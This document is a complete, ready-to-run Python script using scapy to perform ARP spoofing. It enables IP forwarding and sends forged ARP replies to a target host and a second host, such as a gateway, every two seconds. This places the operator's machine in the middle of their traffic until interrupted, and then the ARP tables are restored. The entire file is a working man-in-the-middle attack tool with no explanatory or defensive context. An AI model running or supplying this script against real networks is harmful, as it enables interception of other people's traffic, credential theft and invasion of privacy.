#!/usr/bin/env python
import scapy.all as scapy
import time
import subprocess
import argparse
import sys


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="IP address of the target", required=True)
    parser.add_argument("-s", "--spoof", dest="spoof_ip", help="IP address to spoof", required=True)
    return parser.parse_args()


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Could not get MAC address for {ip}. Exiting...")
        sys.exit(1)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Explicitly construct Ethernet layer to avoid warnings
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.Ether(dst=dest_mac) / scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.sendp(packet, count=4, verbose=False)


# Enable IP forwarding
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

sent_packets_count = 0
options = get_argument()

try:
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C. Restoring ARP tables and quitting...")
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)
    print("[+] ARP tables restored.")
